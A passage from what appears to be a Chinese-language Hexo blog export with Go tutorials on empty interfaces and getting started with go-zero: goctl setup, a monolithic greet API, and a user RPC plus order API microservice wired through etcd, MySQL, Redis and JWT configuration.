<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 定义一个空接口x</span></span><br><span class="line">    <span class="keyword">var</span> x <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">    s := <span class="string">&quot;pprof.cn&quot;</span></span><br><span class="line">    x = s</span><br><span class="line">    fmt.Printf(<span class="string">&quot;type:%T value:%v\n&quot;</span>, x, x)</span><br><span class="line">    i := <span class="number">100</span></span><br><span class="line">    x = i</span><br><span class="line">    fmt.Printf(<span class="string">&quot;type:%T value:%v\n&quot;</span>, x, x)</span><br><span class="line">    b := <span class="literal">true</span></span><br><span class="line">    x = b</span><br><span class="line">    fmt.Printf(<span class="string">&quot;type:%T value:%v\n&quot;</span>, x, x)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>空接口作为函数的参数</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 空接口作为函数参数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">show</span><span class="params">(a <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;type:%T value:%v\n&quot;</span>, a, a)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>空接口作为map的值</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 空接口作为map值</span></span><br><span class="line">    <span class="keyword">var</span> studentInfo = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">    studentInfo[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;李白&quot;</span></span><br><span class="line">    studentInfo[<span class="string">&quot;age&quot;</span>] = <span class="number">18</span></span><br><span class="line">    studentInfo[<span class="string">&quot;married&quot;</span>] = <span class="literal">false</span></span><br><span class="line">    fmt.Println(studentInfo)</span><br></pre></td></tr></table></figure>

<ul>
<li>综合运用可以参考此笔记中<a href="/aposts/43aefcf6/">go中字符串,切片,数组,map</a>中的map下空接口接受字符串json，然后反序列化的例子</li>
</ul>
]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title>go-zero入门实践</title>
    <url>/aposts/93e757c2/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>本次教程主要来自于<a href="https://www.w3cschool.cn/gozero/">这里</a></p>
<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><ul>
<li>安装依赖goctl，用命令进行安装：<code>go install github.com/zeromicro/go-zero/tools/goctl@latest</code><ul>
<li><a href="https://www.cnblogs.com/kevinwan/p/16325802.html">微服务效率工具 goctl 深度解析</a></li>
</ul>
</li>
<li>安装成功后，输入<code>go env</code> 找到<code>GOPATH</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\gowork\studyGoZero&gt;go env</span><br><span class="line">set GO111MODULE=on</span><br><span class="line">set GOPATH=C:\Users\Administrator\go</span><br><span class="line">set GOROOT=E:\app\Go</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<ul>
<li>把<code>C:\Users\Administrator\go\bin\goctl.exe</code> 拷贝到GOROOT\bin目录下</li>
<li>查看版本成功</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\gowork&gt; goctl --version</span><br><span class="line">goctl version 1.5.4 windows/amd64</span><br></pre></td></tr></table></figure>

<ul>
<li>安装<code>protoc</code> ，查看他的<a href="https://go-zero.dev/docs/tasks/installation/protoc">作用</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">goctl env check --install --verbose --force</span><br></pre></td></tr></table></figure>

<ul>
<li>安装<code>protoc</code> 成功后，把<code>C:\Users\Administrator\go\bin\</code> 的相关文件拷贝到<code>GOROOT\bin</code></li>
</ul>
<h2 id="go-zero单体服务"><a href="#go-zero单体服务" class="headerlink" title="go-zero单体服务"></a>go-zero单体服务</h2><ul>
<li>创建并初始化项目，生成greet服务为api层（对外接口）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\gowork&gt;mkdir go-zero-demo</span><br><span class="line">E:\proj\gowork&gt;cd go-zero-demo</span><br><span class="line">E:\proj\gowork\go-zero-demo&gt;go mod init go-zero-demo</span><br><span class="line">go: creating new go.mod: module go-zero-demo</span><br><span class="line">E:\proj\gowork\go-zero-demo&gt;goctl api new greet</span><br><span class="line">Done.</span><br><span class="line">E:\proj\gowork\go-zero-demo&gt;go mod tidy</span><br></pre></td></tr></table></figure>

<ul>
<li>查看greet的服务目录</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\gowork\go-zero-demo&gt;tree /f</span><br><span class="line"></span><br><span class="line">│  go.mod</span><br><span class="line">│  go.sum</span><br><span class="line">│</span><br><span class="line">└─greet</span><br><span class="line">    │  greet.api</span><br><span class="line">    │  greet.go</span><br><span class="line">    │</span><br><span class="line">    ├─etc</span><br><span class="line">    │      greet-api.yaml</span><br><span class="line">    │</span><br><span class="line">    └─internal</span><br><span class="line">        ├─config</span><br><span class="line">        │      config.go</span><br><span class="line">        │</span><br><span class="line">        ├─handler</span><br><span class="line">        │      greethandler.go</span><br><span class="line">        │      routes.go</span><br><span class="line">        │</span><br><span class="line">        ├─logic</span><br><span class="line">        │      greetlogic.go</span><br><span class="line">        │</span><br><span class="line">        ├─svc</span><br><span class="line">        │      servicecontext.go</span><br><span class="line">        │</span><br><span class="line">        └─types</span><br><span class="line">                types.go</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><code> greet\greet.api</code> 中就是对外的接口</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type Request &#123;</span><br><span class="line">	Name string `path:&quot;name,options=you|me&quot;`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Response &#123;</span><br><span class="line">	Message string `json:&quot;message&quot;`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">service greet-api &#123;</span><br><span class="line">	@handler GreetHandler</span><br><span class="line">	get /from/:name(Request) returns (Response) // 对外访问接口路径为：/from/name</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="编写逻辑"><a href="#编写逻辑" class="headerlink" title="编写逻辑"></a>编写逻辑</h3><p><code>E:\proj\gowork\go-zero-demo\greet\internal\logic\greetlogic.go1</code> 代码中编写如下逻辑：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func (l *GreetLogic) Greet(req *types.Request) (resp *types.Response, err error) &#123;</span><br><span class="line">	return &amp;types.Response&#123;</span><br><span class="line">		Message: &quot;Hello go-zero&quot;,</span><br><span class="line">	&#125;, nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="启动并访问服务"><a href="#启动并访问服务" class="headerlink" title="启动并访问服务"></a>启动并访问服务</h3><ul>
<li>启动服务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go run .\greet.go </span><br><span class="line">Starting server at 0.0.0.0:8888...</span><br></pre></td></tr></table></figure>

<ul>
<li>浏览器访问:<code>http://localhost:8888/from/you</code></li>
</ul>
<p><img src="/aposts/93e757c2/image-20230726113435097.png" alt="image-20230726113435097"></p>
<h2 id="go-zero-微服务"><a href="#go-zero-微服务" class="headerlink" title="go-zero 微服务"></a>go-zero 微服务</h2><ul>
<li><p>api部分其实和单体服务的创建逻辑是一样的，只是在单体服务中没有服务间的通讯而已， 且微服务中api服务会多一些rpc调用的配置。</p>
</li>
<li><p>假设我们在开发一个商城项目，而开发者小明负责**用户模块(user)<strong>和</strong>订单模块(order)**的开发，我们姑且将这两个模块拆分成两个微服务</p>
</li>
</ul>
<h3 id="演示功能目标"><a href="#演示功能目标" class="headerlink" title="演示功能目标"></a>演示功能目标</h3><ul>
<li>订单服务(order)提供一个查询接口</li>
<li>用户服务(user)提供一个方法供订单服务获取用户信息</li>
</ul>
<h3 id="服务设计分析"><a href="#服务设计分析" class="headerlink" title="服务设计分析"></a>服务设计分析</h3><p>根据情景提要我们可以得知，订单是直接面向用户，通过http协议访问数据，而订单内部需要获取用户的一些基础数据，既然我们的服务是采用微服务的架构设计， 那么两个服务（user, order）就必须要进行数据交换，服务间的数据交换即服务间的通讯，到了这里，采用合理的通讯协议也是一个开发人员需要 考虑的事情，可以通过http，rpc等方式来进行通讯，这里我们选择rpc来实现服务间的通讯，相信这里我已经对”rpc服务存在有什么作用？”已经作了一个比较好的场景描述。 当然，一个服务开发前远不止这点设计分析，我们这里就不详细描述了。从上文得知，我们需要一个</p>
<ul>
<li>user rpc</li>
<li>order api</li>
</ul>
<p>两个服务来初步实现这个小demo。</p>
<h3 id="创建工程"><a href="#创建工程" class="headerlink" title="创建工程"></a>创建工程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\gowork&gt;mkdir study-gozero-demo</span><br><span class="line">E:\proj\gowork&gt;cd study-gozero-demo</span><br><span class="line">E:\proj\gowork\study-gozero-demo&gt;go mod init study-gozero-demo</span><br></pre></td></tr></table></figure>

<h3 id="创建user-rpc服务"><a href="#创建user-rpc服务" class="headerlink" title="创建user rpc服务"></a>创建user rpc服务</h3><ul>
<li>创建user rpc服务的目录里</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\gowork\study-gozero-demo\&gt;mkdir -p mall/user/rpc</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意在win中，我使用的git窗口编写的mkdri命令，在cmd中这样创建有问题</p>
</blockquote>
<ul>
<li>添加<code>user.proto</code>文件，增加<code>getUser</code>方法</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syntax = &quot;proto3&quot;;</span><br><span class="line"></span><br><span class="line">package user;</span><br><span class="line"></span><br><span class="line">// protoc-gen-go 版本大于1.4.0, proto文件需要加上go_package,否则无法生成</span><br><span class="line">option go_package = &quot;./user&quot;;</span><br><span class="line"></span><br><span class="line">message IdRequest &#123;</span><br><span class="line">    string id = 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message UserResponse &#123;</span><br><span class="line">    // 用户id</span><br><span class="line">    string id = 1;</span><br><span class="line">    // 用户名称</span><br><span class="line">    string name = 2;</span><br><span class="line">    // 用户性别</span><br><span class="line">    string gender = 3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">service User &#123;</span><br><span class="line">    rpc getUser(IdRequest) returns(UserResponse);  //对外开发的接口</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>生成rpc目录和代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\gowork\study-gozero-demo\mall\user\rpc&gt; goctl rpc protoc user.proto --go_out=. --go-grpc_out=. --zrpc_out=.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Done.</span><br></pre></td></tr></table></figure>

<blockquote>
<p>vs code ide的终端中执行的此命令.最终生成的go服务源代码文件在目录：E:\proj\gowork\study-gozero-demo\mall\user\rpc\userclient\user.go</p>
</blockquote>
<ul>
<li>填充业务逻辑其实就是user.proto中生成的getUser，目录为：<code>E:\proj\gowork\study-gozero-demo\mall\user\rpc\internal\logic\getuserlogic.go</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func (l *GetUserLogic) GetUser(in *user.IdRequest) (*user.UserResponse, error) &#123;</span><br><span class="line">	// todo: add your logic here and delete this line</span><br><span class="line"></span><br><span class="line">	// 新增的代码</span><br><span class="line"> return &amp;user.UserResponse&#123;</span><br><span class="line">            Id:   &quot;1&quot;,</span><br><span class="line">            Name: &quot;test&quot;,</span><br><span class="line">    &#125;, nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>若发现这里引用包报错，可以使用<code>go mod tidy</code> 下载依赖</p>
</blockquote>
<h3 id="创建order-api服务"><a href="#创建order-api服务" class="headerlink" title="创建order api服务"></a>创建order api服务</h3><ul>
<li>创建 <code>order api</code>服务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Administrator@WIN-20230710BAT MINGW64 /e/proj/gowork/study-gozero-demo/mall</span><br><span class="line">$ mkdir -p order/api &amp;&amp; cd order/api</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>git 窗口执行</p>
</blockquote>
<ul>
<li>编写添加api文件目录为：<code>E:\proj\gowork\study-gozero-demo\mall\order\api\order.api</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type(</span><br><span class="line">    OrderReq &#123;</span><br><span class="line">        Id string `path:&quot;id&quot;`</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    OrderReply &#123;</span><br><span class="line">        Id string `json:&quot;id&quot;`</span><br><span class="line">        Name string `json:&quot;name&quot;`</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line">service order &#123;</span><br><span class="line">    @handler getOrder</span><br><span class="line">    get /api/order/get/:id (OrderReq) returns (OrderReply)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>生成order服务，<strong>非rpc</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\study-gozero-demo\mall\order\api&gt; goctl api go -api order.api -dir .</span><br></pre></td></tr></table></figure>

<ul>
<li><p>添加user rpc配置目录地址为</p>
<p><code>E:\proj\gowork\study-gozero-demo\mall\order\api\internal\config\config.go</code></p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package config</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;github.com/zeromicro/go-zero/rest&quot;</span><br><span class="line">	&quot;github.com/zeromicro/go-zero/zrpc&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type Config struct &#123;</span><br><span class="line">	rest.RestConf</span><br><span class="line">	UserRpc zrpc.RpcClientConf // 这个就是新增的user rpc服务</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>添加yaml配置目录为<code>E\proj\gowork\study-gozero-demo\mall\order\api\etc\order.yaml</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Name: order</span><br><span class="line">Host: 0.0.0.0</span><br><span class="line">Port: 8888</span><br><span class="line">UserRpc: -- 从这里开始为新增</span><br><span class="line">  Etcd:</span><br><span class="line">    Hosts:</span><br><span class="line">    - 127.0.0.1:2379</span><br><span class="line">    Key: user.rpc</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li><p>完善服务依赖目录为</p>
<p><code>E:\proj\gowork\study-gozero-demo\mall\order\api\internal\svc\servicecontext.go</code></p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package svc</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;study-gozero-demo/mall/order/api/internal/config&quot;</span><br><span class="line">	&quot;study-gozero-demo/mall/user/rpc/userclient&quot; // 引用最终生成user服务代码路径</span><br><span class="line"></span><br><span class="line">	&quot;github.com/zeromicro/go-zero/zrpc&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type ServiceContext struct &#123;</span><br><span class="line">	Config  config.Config</span><br><span class="line">	UserRpc userclient.User // 引用User服务中的GetUser函数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func NewServiceContext(c config.Config) *ServiceContext &#123;</span><br><span class="line">	return &amp;ServiceContext&#123;</span><br><span class="line">		Config: c,</span><br><span class="line">		//加入user rpc服务</span><br><span class="line">		UserRpc: userclient.NewUser(zrpc.MustNewClient(c.UserRpc)),</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>添加order演示逻辑</p>
<p>给<code>E:\proj\gowork\study-gozero-demo\mall\order\api\internal\logic\getorderlogic</code> 添加业务逻辑</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package logic</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;context&quot;</span><br><span class="line">	&quot;errors&quot;</span><br><span class="line"></span><br><span class="line">	&quot;study-gozero-demo/mall/order/api/internal/svc&quot;</span><br><span class="line">	&quot;study-gozero-demo/mall/order/api/internal/types&quot;</span><br><span class="line"></span><br><span class="line">	// 引用</span><br><span class="line">	&quot;study-gozero-demo/mall/user/rpc/user&quot;</span><br><span class="line"></span><br><span class="line">	&quot;github.com/zeromicro/go-zero/core/logx&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type GetOrderLogic struct &#123;</span><br><span class="line">	logx.Logger</span><br><span class="line">	ctx    context.Context</span><br><span class="line">	svcCtx *svc.ServiceContext</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func NewGetOrderLogic(ctx context.Context, svcCtx *svc.ServiceContext) *GetOrderLogic &#123;</span><br><span class="line">	return &amp;GetOrderLogic&#123;</span><br><span class="line">		Logger: logx.WithContext(ctx),</span><br><span class="line">		ctx:    ctx,</span><br><span class="line">		svcCtx: svcCtx, // 引用order的服务，然后才能调用order服务中的user rpc</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (l *GetOrderLogic) GetOrder(req *types.OrderReq) (resp *types.OrderReply, err error) &#123;</span><br><span class="line">	// todo: add your logic here and delete this line</span><br><span class="line"></span><br><span class="line">	// 新增代码，注意这里的&amp;user，应用的是user rpc的user/user.pb.go中内容,IdRequest其实就是对应入参（user.proto定义的）</span><br><span class="line">		// 获取订单之前，需要盘点用户的id是否存在，若不存在则返回用户不存在报错，若存在则返回test order</span><br><span class="line">	user, err := l.svcCtx.UserRpc.GetUser(l.ctx, &amp;user.IdRequest&#123;</span><br><span class="line">		Id: &quot;1&quot;,</span><br><span class="line">	&#125;)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if user.Name != &quot;test&quot; &#123;</span><br><span class="line">		return nil, errors.New(&quot;用户不存在&quot;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return &amp;types.OrderReply&#123;</span><br><span class="line">		Id:   req.Id,</span><br><span class="line">		Name: &quot;test order&quot;,</span><br><span class="line">	&#125;, nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="启动服务并验证"><a href="#启动服务并验证" class="headerlink" title="启动服务并验证"></a>启动服务并验证</h3><ul>
<li>启动本地etcd</li>
</ul>
<blockquote>
<p> 注意本地安装<a href="https://github.com/etcd-io/etcd/releases">etcd</a>，打开<code>E:\app\etcd-v3.4.27-windows-amd64\etcd.exe</code>启动服务</p>
<p>etcd是一个分布式一致性键值存储，其主要用于分布式系统的共享配置和服务发现。</p>
</blockquote>
<ul>
<li>启动user rpc</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\gowork\study-gozero-demo\mall\user\rpc&gt; go run .\user.go</span><br></pre></td></tr></table></figure>

<ul>
<li>启动order api</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\study-gozero-demo\mall\order\api&gt; go run order.go</span><br><span class="line">Starting server at 0.0.0.0:8888...</span><br><span class="line">&#123;&quot;@timestamp&quot;:&quot;2023-07-26T16:36:58.057+08:00&quot;,&quot;caller&quot;:&quot;stat/usage.go:61&quot;,&quot;content&quot;:&quot;CPU: 0m, MEMORY: Alloc=3.2Mi, TotalAlloc=6.1Mi, Sys=17.9Mi, NumGC=3&quot;,&quot;level&quot;:&quot;stat&quot;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>访问order api</li>
</ul>
<p><img src="/aposts/93e757c2/image-20230726164009157.png" alt="image-20230726164009157"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如上代码展示了，单体服务和微服务分别运用，下一篇文章我们将会加上数据库、jwt鉴权、以及具体的增删改查</p>
]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
        <tag>go-zero</tag>
      </tags>
  </entry>
  <entry>
    <title>go-zero入门实践三</title>
    <url>/aposts/b06d40af/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li><a href="/aposts/93e757c2">入门实践一</a> 介绍了单体服务和微服务的简单实例，<a href="/aposts/f231d6a2">入门实践二</a> 介绍了单体服务结合mysql,redis,jwt等方便的知识</li>
<li>本篇主要介绍为微服务的具体使用场景</li>
</ul>
<h2 id="user-rpc"><a href="#user-rpc" class="headerlink" title="user rpc"></a>user rpc</h2><ul>
<li>把user&#x2F;rpc 目录内容清空</li>
<li><code>user/rpc/user.proto</code> 内容如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syntax = &quot;proto3&quot;;</span><br><span class="line"></span><br><span class="line">package user;</span><br><span class="line"></span><br><span class="line">// protoc-gen-go 版本大于1.4.0, proto文件需要加上go_package,否则无法生成</span><br><span class="line">option go_package = &quot;./user&quot;;</span><br><span class="line"></span><br><span class="line">message IdRequest &#123;</span><br><span class="line">    int64 id = 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message UserResponse &#123;</span><br><span class="line">    // 用户id</span><br><span class="line">    int64 id = 1;</span><br><span class="line">    // 用户名称</span><br><span class="line">    string username = 2;</span><br><span class="line">    // 用户性别</span><br><span class="line">    string gender = 3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">service User &#123;</span><br><span class="line">    rpc getUser(IdRequest) returns(UserResponse);  //对外开发的接口</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>生成rpc目录和代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\gowork\study-gozero-demo\mall\user\rpc&gt; goctl rpc protoc user.proto --go_out=. --go-grpc_out=. --zrpc_out=.</span><br></pre></td></tr></table></figure>

<ul>
<li>配置<code>user/rpc/internal/config/config.go</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package config</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;github.com/zeromicro/go-zero/core/stores/cache&quot;</span><br><span class="line">	&quot;github.com/zeromicro/go-zero/zrpc&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type Config struct &#123;</span><br><span class="line">	zrpc.RpcServerConf</span><br><span class="line"></span><br><span class="line">	// 添加mysql配置</span><br><span class="line">	Mysql struct &#123;</span><br><span class="line">		DataSource string</span><br><span class="line">	&#125;</span><br><span class="line">	CacheRedis cache.CacheConf</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>配置<code>/user/rpc/etc/user.yaml</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Name: user.rpc</span><br><span class="line">ListenOn: 0.0.0.0:8081</span><br><span class="line">Etcd:</span><br><span class="line">  Hosts:</span><br><span class="line">  - 127.0.0.1:2379</span><br><span class="line">  Key: user.rpc</span><br><span class="line"># 加入MySQL连接字符串  </span><br><span class="line">Mysql:</span><br><span class="line">  DataSource: root:123456@tcp(127.0.0.1:3306)/go_zero?charset=utf8mb4&amp;parseTime=true&amp;loc=Asia%2FShanghai</span><br><span class="line">CacheRedis:</span><br><span class="line">  - Host: 127.0.0.1:6379</span><br><span class="line">    Pass: &quot;&quot;</span><br><span class="line">    Type: node</span><br></pre></td></tr></table></figure>

<ul>
<li>添加资源依赖<code>/user/rpc/internal/svc/servicecontext.go</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package svc</span><br><span class="line">import (</span><br><span class="line">	&quot;study-gozero-demo/mall/user/model&quot;</span><br><span class="line">	&quot;study-gozero-demo/mall/user/rpc/internal/config&quot;</span><br><span class="line">	&quot;github.com/zeromicro/go-zero/core/stores/sqlx&quot;</span><br><span class="line">)</span><br><span class="line">type ServiceContext struct &#123;</span><br><span class="line">	Config config.Config</span><br><span class="line">	// 引入model层的增删改查</span><br><span class="line">	UserModel model.UserModel</span><br><span class="line">&#125;</span><br><span class="line">func NewServiceContext(c config.Config) *ServiceContext &#123;</span><br><span class="line">	// 初始化mysql连接</span><br><span class="line">	conn := sqlx.NewMysql(c.Mysql.DataSource)</span><br><span class="line">	return &amp;ServiceContext&#123;</span><br><span class="line">		Config: c,</span><br><span class="line">		// 调用user/model层代码</span><br><span class="line">		UserModel: model.NewUserModel(conn, c.CacheRedis),</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>如上那些配置其实和api层的配置基本上一样，都是加入mysql,引用mode层的代码</p>
</blockquote>
<ul>
<li>添加rpc逻辑<code>user/rpc/internal/logic/getuserlogic.go</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func (l *GetUserLogic) GetUser(in *user.IdRequest) (*user.UserResponse, error) &#123;</span><br><span class="line">	// todo: add your logic here and delete this line</span><br><span class="line">	one, err := l.svcCtx.UserModel.FindOne(l.ctx, in.Id)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line">	return &amp;user.UserResponse&#123;</span><br><span class="line">		Id:       one.Id,</span><br><span class="line">		Username: one.Username.String,</span><br><span class="line">		Gender:   one.Gender.String,</span><br><span class="line">	&#125;, nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="order-api"><a href="#order-api" class="headerlink" title="order api"></a>order api</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><ul>
<li>关于生成model代码，mysql等配置就省略了，和user api的配置一模一样，注意需要保留之前jwt配置</li>
<li>本地数据库需要加上order表，表中字段为：<code>id,productname,price,unit</code></li>
<li>编写<code>order/api/oder.api</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type (</span><br><span class="line">	OrderReq &#123;</span><br><span class="line">		Id     int `json:&quot;id&quot;`</span><br><span class="line">		UserId int `json:&quot;userid&quot;`</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	OrderReply &#123;</span><br><span class="line">		Id          int    `json:&quot;id&quot;`</span><br><span class="line">		Productname string `json:&quot;productname&quot;`</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	OrderAddReq &#123;</span><br><span class="line">		Productname string `json:&quot;productname&quot;`</span><br><span class="line">		Price       string `json:&quot;price&quot;`</span><br><span class="line">		Unit        string `json:&quot;unit&quot;`</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	OrderAddRes &#123;</span><br><span class="line">		Code     int    `json:&quot;code&quot;`</span><br><span class="line">		Messsage string `json:&quot;message&quot;`</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">// 在哪个服务头上加这个验证，就是需要jwt鉴权</span><br><span class="line">@server(</span><br><span class="line">	jwt: Auth</span><br><span class="line">)</span><br><span class="line">service order &#123;</span><br><span class="line">	@handler orderAdd</span><br><span class="line">	post /api/order/OrderAdd (OrderAddReq) returns (OrderAddRes)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">service order &#123;</span><br><span class="line">	@handler getOrder</span><br><span class="line">	// get /api/order/get/:id (OrderReq) returns (OrderReply)</span><br><span class="line">	get /api/order/get (OrderReq) returns (OrderReply)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>添加UserRpc配置及yaml配置项，<code>order/api/internal/config/config.go</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package config</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;github.com/zeromicro/go-zero/core/stores/cache&quot;</span><br><span class="line">	&quot;github.com/zeromicro/go-zero/rest&quot;</span><br><span class="line">	&quot;github.com/zeromicro/go-zero/zrpc&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type Config struct &#123;</span><br><span class="line">	rest.RestConf</span><br><span class="line">	// 添加mysql配置</span><br><span class="line">	Mysql struct &#123;</span><br><span class="line">		DataSource string</span><br><span class="line">	&#125;</span><br><span class="line">	// 使用缓存</span><br><span class="line">	CacheRedis cache.CacheConf</span><br><span class="line">	Auth       struct &#123;</span><br><span class="line">		AccessSecret string</span><br><span class="line">		AccessExpire int64</span><br><span class="line">	&#125;</span><br><span class="line">	// 引用user rpc</span><br><span class="line">	UserRpc zrpc.RpcClientConf</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><code>order/api/etc/order.yaml</code> 加入user  rpc配置</li>
</ul>
